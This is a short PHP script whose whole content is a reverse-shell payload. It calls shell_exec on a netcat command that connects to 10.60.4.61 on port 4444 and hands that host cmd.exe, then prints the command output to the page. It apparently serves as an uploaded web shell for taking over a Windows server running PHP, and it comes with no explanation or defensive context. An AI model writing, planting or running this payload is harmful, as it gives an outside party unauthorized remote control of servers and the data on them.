<?php

$output = ('cd /netcat && nc -nv 10.60.4.61 4444 -e cmd.exe');
$cmd = shell_exec($output);
echo "<pre>{$cmd}</pre>";

?>